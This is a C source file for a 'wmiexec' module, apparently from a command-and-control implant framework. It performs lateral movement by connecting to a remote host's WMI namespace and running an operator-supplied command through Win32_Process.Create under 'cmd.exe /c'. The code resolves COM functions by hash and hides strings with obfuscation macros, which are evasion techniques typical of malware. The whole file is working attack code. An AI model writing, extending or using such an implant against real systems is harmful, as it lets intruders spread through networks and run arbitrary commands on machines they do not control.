#include "config.h"
#ifdef INCLUDE_CMD_WMIEXEC

#include "commands.h"
#include "common.h"

// wmiexec <host> <command>: lateral movement via DCOM/WMI.
// CoInitializeEx -> CoCreateInstance(CLSID_WbemLocator) -> ConnectServer(\\host\root\cimv2)
// -> CoSetProxyBlanket -> GetObject Win32_Process -> ExecMethod .Create(cmdline).
// Fire-and-forget: process is created on the remote host, no output capture.
// COM APIs are not in the instance Win32 table - resolve dynamically from
// ole32.dll/oleaut32.dll via LoadLibraryA + resolve_function.

static const GUID CLSID_WbemLocator = { 0x4590f811, 0x1d3a, 0x11d0, { 0x89, 0x1f, 0x00, 0xaa, 0x00, 0x4b, 0x2e, 0x24 } };
static const GUID IID_IWbemLocator  = { 0xdc12a687, 0x737f, 0x11cf, { 0x88, 0x4d, 0x00, 0xaa, 0x00, 0x4b, 0x2e, 0x24 } };

typedef HRESULT (WINAPI *fnCoInitializeEx)(LPVOID, DWORD);
typedef VOID    (WINAPI *fnCoUninitialize)(VOID);
typedef HRESULT (WINAPI *fnCoCreateInstance)(REFCLSID, LPUNKNOWN, DWORD, REFIID, LPVOID*);
typedef HRESULT (WINAPI *fnCoInitializeSecurity)(PSECURITY_DESCRIPTOR, LONG, VOID*, VOID*, DWORD, DWORD, VOID*, DWORD, VOID*);
typedef HRESULT (WINAPI *fnCoSetProxyBlanket)(VOID*, DWORD, DWORD, OLECHAR*, DWORD, DWORD, RPC_AUTH_IDENTITY_HANDLE, DWORD);
typedef BSTR    (WINAPI *fnSysAllocString)(const OLECHAR*);
typedef VOID    (WINAPI *fnSysFreeString)(BSTR);

// Minimal COM vtables (nostdlib: no ole32 headers beyond the base window types)
struct IWbemLocatorVtbl {
    VOID*   QueryInterface;
    VOID*   AddRef;
    ULONG   (STDMETHODCALLTYPE *Release)(VOID*);
    HRESULT (STDMETHODCALLTYPE *ConnectServer)(VOID*, BSTR, BSTR, BSTR, LONG, LONG, BSTR, VOID*, VOID**);
};
struct IWbemLocator_s { IWbemLocatorVtbl* lpVtbl; };

struct IWbemServicesVtbl {
    VOID*   QueryInterface;
    VOID*   AddRef;
    ULONG   (STDMETHODCALLTYPE *Release)(VOID*);
    VOID*   pad[3];             // 3-5: OpenNamespace, CancelAsyncCall, QueryObjectSink
    HRESULT (STDMETHODCALLTYPE *GetObject)(VOID*, BSTR, LONG, VOID*, VOID**, VOID**);  // 6
    VOID*   pad2[17];           // 7-23: GetObjectAsync..ExecNotificationQueryAsync
    HRESULT (STDMETHODCALLTYPE *ExecMethod)(VOID*, BSTR, BSTR, LONG, VOID*, VOID*, VOID**, VOID**);  // 24
};
struct IWbemServices_s { IWbemServicesVtbl* lpVtbl; };

struct IWbemClassObjectVtbl {
    VOID*   QueryInterface;             // 0
    VOID*   AddRef;                     // 1
    ULONG   (STDMETHODCALLTYPE *Release)(VOID*);  // 2
    VOID*   pad[7];                     // 3-9: GetQualifierSet..Next
    VOID*   pad2[4];                    // 10-13: EndEnumeration..GetObjectText
    VOID*   pad3;                       // 14: SpawnDerivedClass
    HRESULT (STDMETHODCALLTYPE *SpawnInstance)(VOID*, LONG, VOID**);  // 15
    VOID*   pad5;                       // 16: CompareTo
    VOID*   pad6;                       // 17: GetPropertyOrigin
    VOID*   pad7b;                      // 18: InheritsFrom
    HRESULT (STDMETHODCALLTYPE *GetMethod)(VOID*, BSTR, LONG, VOID**, VOID**);  // 19
    VOID*   pad_put[1];                 // 20: PutMethod
};
struct IWbemClassObject_s { IWbemClassObjectVtbl* lpVtbl; };

VOID cmd_wmiexec(PINSTANCE inst, PPARSER args, PPACKAGE response) {
    DWORD host_len = 0, cmd_len = 0;
    char* host = parser_string(args, &host_len);
    char* command = parser_string(args, &cmd_len);

    if (!host || host_len == 0) {
        package_add_string(inst, response, XSTR("No hostname provided"));
        response->is_error = TRUE;
        return;
    }
    if (!command || cmd_len == 0) {
        package_add_string(inst, response, XSTR("No command provided"));
        response->is_error = TRUE;
        return;
    }

    // Load COM libraries (not pre-resolved in inst->Win32)
    HMODULE h_ole32 = inst->Win32.LoadLibraryA(XSTR("ole32.dll"));
    // combase first: ole32 forwards CoInitializeEx/CoInitializeSecurity etc. to
    // combase.dll; resolving a forwarded export yields a string, not code
    HMODULE h_combase = inst->Win32.LoadLibraryA(XSTR("combase.dll"));
    HMODULE h_oleaut32 = inst->Win32.LoadLibraryA(XSTR("oleaut32.dll"));
    if (!h_ole32 || !h_oleaut32) {
        package_add_string(inst, response, XSTR("Failed to load COM libraries"));
        response->is_error = TRUE;
        return;
    }

    fnCoInitializeEx        pCoInitializeEx = (fnCoInitializeEx)resolve_function(h_ole32, hash_string_djb2(XSTR("CoInitializeEx")));
    if (!pCoInitializeEx) pCoInitializeEx = (fnCoInitializeEx)resolve_function(h_combase, hash_string_djb2(XSTR("CoInitializeEx")));
    fnCoUninitialize        pCoUninitialize = (fnCoUninitialize)resolve_function(h_ole32, hash_string_djb2(XSTR("CoUninitialize")));
    if (!pCoUninitialize) pCoUninitialize = (fnCoUninitialize)resolve_function(h_combase, hash_string_djb2(XSTR("CoUninitialize")));
    fnCoCreateInstance      pCoCreateInstance = (fnCoCreateInstance)resolve_function(h_ole32, hash_string_djb2(XSTR("CoCreateInstance")));
    if (!pCoCreateInstance) pCoCreateInstance = (fnCoCreateInstance)resolve_function(h_combase, hash_string_djb2(XSTR("CoCreateInstance")));
    fnCoInitializeSecurity  pCoInitializeSecurity = (fnCoInitializeSecurity)resolve_function(h_ole32, hash_string_djb2(XSTR("CoInitializeSecurity")));
    if (!pCoInitializeSecurity) pCoInitializeSecurity = (fnCoInitializeSecurity)resolve_function(h_combase, hash_string_djb2(XSTR("CoInitializeSecurity")));
    fnCoSetProxyBlanket     pCoSetProxyBlanket = (fnCoSetProxyBlanket)resolve_function(h_ole32, hash_string_djb2(XSTR("CoSetProxyBlanket")));
    if (!pCoSetProxyBlanket) pCoSetProxyBlanket = (fnCoSetProxyBlanket)resolve_function(h_combase, hash_string_djb2(XSTR("CoSetProxyBlanket")));
    fnSysAllocString        pSysAllocString = (fnSysAllocString)resolve_function(h_oleaut32, hash_string_djb2(XSTR("SysAllocString")));
    fnSysFreeString         pSysFreeString = (fnSysFreeString)resolve_function(h_oleaut32, hash_string_djb2(XSTR("SysFreeString")));

    if (!pCoInitializeEx || !pCoUninitialize || !pCoCreateInstance ||
        !pCoSetProxyBlanket || !pSysAllocString || !pSysFreeString) {
        package_add_string(inst, response, XSTR("Failed to resolve COM APIs"));
        response->is_error = TRUE;
        return;
    }

    pCoInitializeEx(NULL, 0);
    if (pCoInitializeSecurity) {
        pCoInitializeSecurity(NULL, -1, NULL, NULL, 4, 3, NULL, 0, NULL);
    }

    // Build \\host\root\cimv2
    wchar_t ns[512] = { L'\\', L'\\', 0 };
    DWORD ns_idx = 2;
    for (DWORD i = 0; i < host_len && ns_idx < 500; i++)
        ns[ns_idx++] = (wchar_t)host[i];
    wchar_t* suffix = XWSTR(L"\\root\\cimv2");
    for (DWORD i = 0; suffix[i] && ns_idx < 510; i++)
        ns[ns_idx++] = suffix[i];
    ns[ns_idx] = 0;

    IWbemLocator_s* pLoc = NULL;
    HRESULT hr = pCoCreateInstance(CLSID_WbemLocator, NULL, 1 /*CLSIDCTX_INPROC_SERVER*/, IID_IWbemLocator, (VOID**)&pLoc);
    if (FAILED(hr) || !pLoc) {
        pCoUninitialize();
        package_add_string(inst, response, XSTR("CoCreateInstance WbemLocator failed"));
        response->is_error = TRUE;
        return;
    }

    BSTR bstr_ns = pSysAllocString(ns);
    IWbemServices_s* pSvc = NULL;
    hr = pLoc->lpVtbl->ConnectServer(pLoc, bstr_ns, NULL, NULL, 0, 0, NULL, NULL, (VOID**)&pSvc);
    // RPC_C_AUTHN_WINNT(10), RPC_C_AUTHZ_NONE(0), RPC_C_AUTHN_LEVEL_CALL(3),
    // RPC_C_IMP_LEVEL_IMPERSONATE(3), EOAC_NONE(0)
    pCoSetProxyBlanket((VOID*)pSvc, 10, 0, NULL, 3, 3, NULL, 0);
    pSysFreeString(bstr_ns);

    if (FAILED(hr) || !pSvc) {
        pLoc->lpVtbl->Release(pLoc);
        pCoUninitialize();
        package_add_string(inst, response, XSTR("ConnectServer failed - check perms/network"));
        response->is_error = TRUE;
        return;
    }

    // RPC_C_AUTHN_WINNT(10), RPC_C_AUTHZ_NONE(0), PKT_PRIVACY(6), IMPERSONATE(3)
    pCoSetProxyBlanket((VOID*)pSvc, 10, 0, NULL, 6, 3, NULL, 0);

    BSTR bstr_class = pSysAllocString(XWSTR(L"Win32_Process"));
    IWbemClassObject_s* pClass = NULL;
    hr = pSvc->lpVtbl->GetObject(pSvc, bstr_class, 0, NULL, (VOID**)&pClass, NULL);
    if (FAILED(hr) || !pClass) {
        pSysFreeString(bstr_class);
        pSvc->lpVtbl->Release(pSvc);
        pLoc->lpVtbl->Release(pLoc);
        pCoUninitialize();
        package_add_string(inst, response, XSTR("GetObject Win32_Process failed"));
        response->is_error = TRUE;
        return;
    }

    BSTR bstr_method = pSysAllocString(XWSTR(L"Create"));
    IWbemClassObject_s* pInParams = NULL;
    hr = pClass->lpVtbl->GetMethod(pClass, bstr_method, 0, (VOID**)&pInParams, NULL);
    if (FAILED(hr) || !pInParams) {
        pSysFreeString(bstr_method);
        pSysFreeString(bstr_class);
        pClass->lpVtbl->Release(pClass);
        pSvc->lpVtbl->Release(pSvc);
        pLoc->lpVtbl->Release(pLoc);
        pCoUninitialize();
        package_add_string(inst, response, XSTR("GetMethod Create failed"));
        response->is_error = TRUE;
        return;
    }

    IWbemClassObject_s* pInInst = NULL;
    hr = pInParams->lpVtbl->SpawnInstance(pInParams, 0, (VOID**)&pInInst);
    if (FAILED(hr) || !pInInst) {
        pSysFreeString(bstr_method);
        pSysFreeString(bstr_class);
        pInParams->lpVtbl->Release(pInParams);
        pClass->lpVtbl->Release(pClass);
        pSvc->lpVtbl->Release(pSvc);
        pLoc->lpVtbl->Release(pLoc);
        pCoUninitialize();
        package_add_string(inst, response, XSTR("SpawnInstance failed"));
        response->is_error = TRUE;
        return;
    }

    // cmd.exe /c <command>
    wchar_t w_cmd[2048] = {0};
    wchar_t* prefix = XWSTR(L"cmd.exe /c ");
    DWORD cidx = 0;
    for (; prefix[cidx]; cidx++) w_cmd[cidx] = prefix[cidx];
    inst->Win32.MultiByteToWideChar(CP_ACP, 0, command, (int)cmd_len, w_cmd + cidx, 2048 - cidx - 1);

    // IWbemClassObject::Put lives at vtable slot 5 (after QI/AddRef/Release/GetQualifierSet/Get)
    typedef HRESULT (STDMETHODCALLTYPE *fnPut)(VOID*, BSTR, LONG, VOID*, LONG);
    fnPut pPut = (fnPut)((VOID**)pInInst->lpVtbl)[5];

    BSTR bstr_cl = pSysAllocString(XWSTR(L"CommandLine"));
    BSTR bstr_val = pSysAllocString(w_cmd);

    VARIANT var;
    es_memset(&var, 0, sizeof(var));
    var.vt = VT_BSTR;
    var.bstrVal = bstr_val;

    HRESULT hr_put = pPut(pInInst, bstr_cl, 0, &var, 0);
    pSysFreeString(bstr_cl);
    if (FAILED(hr_put)) {
        // report the Put failure separately - 0x800706F4 so far is ambiguous
        static const char mp[] = {'W','M','I',' ','P','u','t',' ','f','a','i','l','e','d',' ','h','r','=','0','x',0};
        char msg[64] = {0};
        es_strcpy(msg, mp);
        char hx[16] = {0}; DWORD v = (DWORD)hr_put; int hi = 0;
        if (!v) hx[hi++] = '0';
        while (v && hi < 15) { int d = v & 0xF; hx[hi++] = (char)(d < 10 ? '0' + d : 'A' + d - 10); v >>= 4; }
        int ml = 0; while (msg[ml]) ml++;
        while (hi > 0 && ml < 60) msg[ml++] = hx[--hi];
        msg[ml] = 0;
        package_add_string(inst, response, msg);
        response->is_error = TRUE;
        pSysFreeString(bstr_val);
        pSysFreeString(bstr_method);
        pSysFreeString(bstr_class);
        pInInst->lpVtbl->Release(pInInst);
        pInParams->lpVtbl->Release(pInParams);
        pClass->lpVtbl->Release(pClass);
        pSvc->lpVtbl->Release(pSvc);
        pLoc->lpVtbl->Release(pLoc);
        pCoUninitialize();
        return;
    }

    IWbemClassObject_s* pOutParams = NULL;
    hr = pSvc->lpVtbl->ExecMethod(pSvc, bstr_class, bstr_method, 0, NULL, pInInst, (VOID**)&pOutParams, NULL);

    pSysFreeString(bstr_val);
    pSysFreeString(bstr_method);
    pSysFreeString(bstr_class);

    if (pOutParams) pOutParams->lpVtbl->Release(pOutParams);
    if (pInInst)    pInInst->lpVtbl->Release(pInInst);
    if (pInParams)  pInParams->lpVtbl->Release(pInParams);
    pClass->lpVtbl->Release(pClass);
    pSvc->lpVtbl->Release(pSvc);
    pLoc->lpVtbl->Release(pLoc);
    pCoUninitialize();

    if (SUCCEEDED(hr)) {
        package_add_string(inst, response, XSTR("Process created via WMI"));
    } else {
        // "WMI ExecMethod failed hr=XXXXXXXX" - no CRT hex printf available
        static const char m3[] = {'W','M','I',' ','E','x','e','c','M','e','t','h','o','d',' ','f','a','i','l','e','d',' ','h','r','=','0','x',0};
        char msg[64] = {0};
        es_strcpy(msg, m3);
        char hx[16] = {0};
        DWORD v = (DWORD)hr;
        int hi = 0;
        if (!v) hx[hi++] = '0';
        while (v && hi < 15) { int d = v & 0xF; hx[hi++] = (char)(d < 10 ? '0' + d : 'A' + d - 10); v >>= 4; }
        int ml = 0; while (msg[ml]) ml++;
        while (hi > 0 && ml < 60) msg[ml++] = hx[--hi];
        msg[ml] = 0;
        package_add_string(inst, response, msg);
        response->is_error = TRUE;
    }
}

#endif
